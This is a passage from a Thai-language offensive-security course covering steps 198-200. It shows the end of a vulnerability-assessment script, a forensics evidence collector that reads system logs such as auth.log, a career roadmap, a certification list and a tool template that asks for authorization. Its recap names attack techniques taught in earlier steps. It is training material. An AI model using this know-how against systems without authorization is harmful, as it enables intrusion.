                return cves
        except:
            pass
        
        return []
    
    def generate_report(self):
        """Generate vulnerability report"""
        report = f"""
# Vulnerability Assessment Report

**Target:** {self.target}
**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M')}
**Total Findings:** {len(self.findings)}

## Open Ports and Services

"""
        for finding in self.findings:
            report += f"""
### Port {finding['port']}/{finding['protocol']} - {finding['service']}
- Version: {finding.get('version', 'Unknown')}
- Vulnerabilities found: {len(finding.get('scripts', []))}
"""
            for script in finding.get('scripts', []):
                report += f"  - [{script['severity']}] {script['id']}: {str(script['output'])[:200]}\n"
        
        return report

assessor = VulnAssessment('192.168.1.1')
print("[*] Starting automated vulnerability assessment...")
print("[!] This requires proper authorization before scanning")
```

---

## ขั้นตอนที่ 199: Incident Response และ Digital Forensics

### Digital Forensics Collection

```python
#!/usr/bin/env python3
# dfir_collector.py - Digital Forensics และ Incident Response

import os
import hashlib
import datetime
import platform
import subprocess
import json

class DFIRCollector:
    def __init__(self, output_dir='/tmp/dfir_evidence'):
        self.output_dir = output_dir
        self.evidence = {}
        self.timeline = []
        os.makedirs(output_dir, exist_ok=True)
    
    def collect_system_info(self):
        """Collect system information"""
        info = {
            'hostname': platform.node(),
            'os': platform.system(),
            'os_version': platform.version(),
            'architecture': platform.machine(),
            'timestamp': datetime.datetime.now().isoformat()
        }
        
        # Network interfaces
        if platform.system() == 'Linux':
            result = subprocess.run(['ip', 'addr'], capture_output=True, text=True)
            info['network_interfaces'] = result.stdout
            
            result = subprocess.run(['netstat', '-tulpn'], capture_output=True, text=True)
            info['listening_ports'] = result.stdout
        
        self.evidence['system_info'] = info
        return info
    
    def collect_processes(self):
        """Collect running processes"""
        processes = []
        
        try:
            import psutil
            for proc in psutil.process_iter(['pid', 'name', 'username', 'cmdline', 'status']):
                try:
                    processes.append({
                        'pid': proc.pid,
                        'name': proc.name(),
                        'username': proc.username(),
                        'cmdline': ' '.join(proc.cmdline()),
                        'status': proc.status()
                    })
                except:
                    pass
        except ImportError:
            result = subprocess.run(['ps', 'auxf'], capture_output=True, text=True)
            processes = result.stdout
        
        self.evidence['processes'] = processes
        return processes
    
    def collect_network_connections(self):
        """Collect active network connections"""
        connections = []
        
        try:
            import psutil
            for conn in psutil.net_connections():
                connections.append({
                    'fd': conn.fd,
                    'family': str(conn.family),
                    'type': str(conn.type),
                    'laddr': str(conn.laddr),
                    'raddr': str(conn.raddr),
                    'status': conn.status,
                    'pid': conn.pid
                })
        except ImportError:
            result = subprocess.run(['netstat', '-anp'], capture_output=True, text=True)
            connections = result.stdout
        
        self.evidence['connections'] = connections
        return connections
    
    def collect_logs(self, log_paths=None):
        """Collect relevant logs"""
        if log_paths is None:
            log_paths = [
                '/var/log/auth.log',
                '/var/log/syslog',
                '/var/log/apache2/access.log',
                '/var/log/nginx/access.log',
                '/var/log/messages'
            ]
        
        collected_logs = {}
        for log_path in log_paths:
            if os.path.exists(log_path):
                try:
                    with open(log_path, 'r', errors='ignore') as f:
                        # Get last 1000 lines
                        lines = f.readlines()
                        collected_logs[log_path] = ''.join(lines[-1000:])
                except:
                    pass
        
        self.evidence['logs'] = collected_logs
        return collected_logs
    
    def hash_file(self, filepath):
        """Calculate file hashes"""
        hashes = {}
        
        try:
            with open(filepath, 'rb') as f:
                content = f.read()
            
            hashes['md5'] = hashlib.md5(content).hexdigest()
            hashes['sha1'] = hashlib.sha1(content).hexdigest()
            hashes['sha256'] = hashlib.sha256(content).hexdigest()
        except:
            pass
        
        return hashes
    
    def build_timeline(self):
        """สร้าง incident timeline"""
        timeline = []
        
        # เพิ่มเหตุการณ์จาก log files
        auth_log = self.evidence.get('logs', {}).get('/var/log/auth.log', '')
        
        import re
        # Parse SSH login events
        ssh_pattern = r'(\w+\s+\d+\s+\d+:\d+:\d+).*sshd.*Accepted.*from (\d+\.\d+\.\d+\.\d+)'
        
        for match in re.finditer(ssh_pattern, auth_log):
            timeline.append({
                'timestamp': match.group(1),
                'event_type': 'SSH Login',
                'source_ip': match.group(2),
                'severity': 'Medium'
            })
        
        # Failed logins
        fail_pattern = r'(\w+\s+\d+\s+\d+:\d+:\d+).*sshd.*Failed.*from (\d+\.\d+\.\d+\.\d+)'
        for match in re.finditer(fail_pattern, auth_log):
            timeline.append({
                'timestamp': match.group(1),
                'event_type': 'Failed Login',
                'source_ip': match.group(2),
                'severity': 'High'
            })
        
        timeline.sort(key=lambda x: x['timestamp'])
        self.timeline = timeline
        return timeline
    
    def export_evidence(self):
        """Export all evidence"""
        evidence_file = os.path.join(self.output_dir, 'evidence.json')
        
        with open(evidence_file, 'w') as f:
            json.dump(self.evidence, f, indent=2, default=str)
        
        timeline_file = os.path.join(self.output_dir, 'timeline.json')
        with open(timeline_file, 'w') as f:
            json.dump(self.timeline, f, indent=2)
        
        print(f"[+] Evidence exported to {self.output_dir}")
        print(f"  - {evidence_file}")
        print(f"  - {timeline_file}")

collector = DFIRCollector()
collector.collect_system_info()
collector.collect_processes()
collector.collect_network_connections()
collector.build_timeline()
collector.export_evidence()
```

---

## ขั้นตอนที่ 200: บทสรุปและทิศทางต่อไป

### Security Professional Roadmap

```
Cybersecurity Career Path:

┌──────────────────────────────────────────────────────┐
│ Beginner (0-1 year)                              │
│  - Linux fundamentals                           │
│  - Networking basics (TCP/IP, DNS, HTTP)        │
│  - Python/Bash scripting                        │
│  - CTF participation (HackTheBox, TryHackMe)   │
│  - Certifications: CompTIA Security+            │
├──────────────────────────────────────────────────────┤
│ Intermediate (1-3 years)                        │
│  - Web application security (OWASP Top 10)     │
│  - Network penetration testing                  │
│  - Active Directory attacks                     │
│  - Certifications: CEH, eJPT, PNPT              │
├──────────────────────────────────────────────────────┤
│ Advanced (3-5 years)                            │
│  - Advanced malware development                │
│  - Red team operations                          │
│  - Cloud security                               │
│  - Certifications: OSCP, CRTO, CRTE             │
├──────────────────────────────────────────────────────┤
│ Expert (5+ years)                               │
│  - Zero-day research                            │
│  - APT simulation                               │
│  - Security leadership/consulting               │
│  - Certifications: OSED, OSEP, OSCE3            │
└──────────────────────────────────────────────────────┘
```

### Certification แนะนำสำหรับ Penetration Tester

```
สายการ Certification:

1. CompTIA Security+ - พื้นฐาน Security
2. eJPT (eLearnSecurity) - เริ่มต้น Pentesting
3. CEH (EC-Council) - อังค์ความรู้อังค์กร
4. PNPT (TCM Security) - ปฏิบัติจริง
5. OSCP (Offensive Security) - มาตรฐานสามัญผู้ทดสอบ
6. CRTO (Zero-Point Security) - Red Team Ops
7. CRTE (Pentester Academy) - Active Directory
8. OSED (Offensive Security) - Exploit Dev
9. OSCE3 (Offensive Security) - Elite level

วิธีเรียนแบบผสมผสาน:
- HackTheBox.com
- TryHackMe.com
- PentesterLab.com
- PortSwigger Web Security Academy
- SANS Courses
```

### Python Security Script Template

```python
#!/usr/bin/env python3
# security_tool_template.py - Template สำหรับ Security Tools

import argparse
import logging
import sys
from datetime import datetime

# ตั้งค่า logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler('tool.log')
    ]
)
logger = logging.getLogger(__name__)

class SecurityTool:
    """Base class สำหรับ Security Tools"""
    
    def __init__(self, target, verbose=False):
        self.target = target
        self.verbose = verbose
        self.results = []
        self.start_time = datetime.now()
    
    def run(self):
        """เรียกใช้ method นี้ใน subclass"""
        raise NotImplementedError
    
    def validate_target(self):
        """Validate target before scanning"""
        import re
        
        # IP address
        ip_pattern = r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$'
        # CIDR
        cidr_pattern = r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d{1,2}$'
        # Domain
        domain_pattern = r'^[a-zA-Z0-9][a-zA-Z0-9-]{0,61}[a-zA-Z0-9]\.[a-zA-Z]{2,}$'
        
        if (re.match(ip_pattern, self.target) or
            re.match(cidr_pattern, self.target) or
            re.match(domain_pattern, self.target)):
            return True
        
        logger.error(f"Invalid target: {self.target}")
        return False
    
    def add_finding(self, severity, title, description, evidence=''):
        """เพิ่ม finding"""
        finding = {
            'severity': severity,
            'title': title,
            'description': description,
            'evidence': evidence,
            'timestamp': datetime.now().isoformat()
        }
        self.results.append(finding)
        
        severity_emoji = {'Critical': '!!!', 'High': '!!', 'Medium': '!', 'Low': '-', 'Info': 'i'}
        logger.info(f"[{severity_emoji.get(severity, '?')}] {title}")
    
    def generate_report(self, output_file=None):
        """Generate markdown report"""
        elapsed = (datetime.now() - self.start_time).total_seconds()
        
        report = f"""
# Security Assessment Report

**Target:** {self.target}
**Tool:** {self.__class__.__name__}
**Date:** {self.start_time.strftime('%Y-%m-%d %H:%M:%S')}
**Duration:** {elapsed:.1f} seconds
**Findings:** {len(self.results)}

## Summary

Critical: {sum(1 for r in self.results if r['severity'] == 'Critical')}
High: {sum(1 for r in self.results if r['severity'] == 'High')}
Medium: {sum(1 for r in self.results if r['severity'] == 'Medium')}
Low: {sum(1 for r in self.results if r['severity'] == 'Low')}

## Detailed Findings

"""
        
        severity_order = ['Critical', 'High', 'Medium', 'Low', 'Info']
        sorted_results = sorted(
            self.results,
            key=lambda x: severity_order.index(x['severity'])
        )
        
        for i, finding in enumerate(sorted_results, 1):
            report += f"""
### [{finding['severity']}] {i}. {finding['title']}

{finding['description']}

"""
            if finding['evidence']:
                report += f"**Evidence:**\n```\n{finding['evidence']}\n```\n\n"
        
        if output_file:
            with open(output_file, 'w') as f:
                f.write(report)
            logger.info(f"Report saved to {output_file}")
        
        return report

def main():
    parser = argparse.ArgumentParser(description='Security Tool')
    parser.add_argument('target', help='Target IP/hostname')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('-o', '--output', help='Output file')
    
    args = parser.parse_args()
    
    # Check authorization (always!)
    print("\n[!] WARNING: Only scan systems you have permission to test!")
    confirm = input("Do you have authorization to scan this target? (yes/no): ")
    
    if confirm.lower() != 'yes':
        print("[-] Aborting - No authorization confirmed")
        sys.exit(1)
    
    logger.info(f"Starting assessment of {args.target}")

if __name__ == '__main__':
    main()
```

### การติดตามข่าวสาร Security

```
แหล่งแสวงหาข้อมูล Security ที่กองทัพเหนือ:

1. NVD (National Vulnerability Database)
   https://nvd.nist.gov/

2. CVE Mitre
   https://cve.mitre.org/

3. Exploit-DB
   https://www.exploit-db.com/

4. Packet Storm Security
   https://packetstormsecurity.com/

5. SecurityFocus
   https://www.securityfocus.com/

6. GitHub Security Advisories
   https://github.com/advisories

7. CISA Alerts
   https://www.cisa.gov/alerts

8. Dark Reading
   https://www.darkreading.com/

9. Bleeping Computer
   https://www.bleepingcomputer.com/

10. Krebs on Security
    https://krebsonsecurity.com/
```

---

## สรุปส่วนที่ 20 และ Steps 181-200

ยินดีด้วยที่เราเรียนรู้ครบ 200 Steps แรก! ส่วนนี้ครอบคลุม:

1. **OPSEC** - Operational Security, Anonymization, Cleanup
2. **LOLBins** - Living off the Land, Windows/Linux techniques
3. **Token Manipulation** - Windows API, impersonation
4. **Kernel Exploitation** - LPE, DirtyCow, PrivEsc scanning
5. **Supply Chain Attacks** - NPM, dependency confusion awareness
6. **SSTI Advanced** - Jinja2, Freemarker, auto-detect
7. **HTTP Smuggling** - CL.TE, TE.CL, cache poisoning
8. **Threat Hunting** - IOC matching, behavioral analysis
9. **Security Automation** - Vulnerability assessment pipeline
10. **DFIR** - Digital forensics, timeline building, evidence collection

### หลักการด้าน Ethics:

> **ความรู้เหล่านี้มีไว้เพื่อ:**
> - ป้องกันระบบของพวกเรา
> - รับมือการทดสอบแบบ Ethical Hacking
> - เรียนรู้เพื่อรู้วิธีที่ผู้โจมตีใช้
> - ไม่ใช้เพื่อโจมตีระบบที่ไม่ได้รับอนุญาต

**คอร์สอยู่ที่ Step 200/1000 - ยังเหลืออีกมาก!**
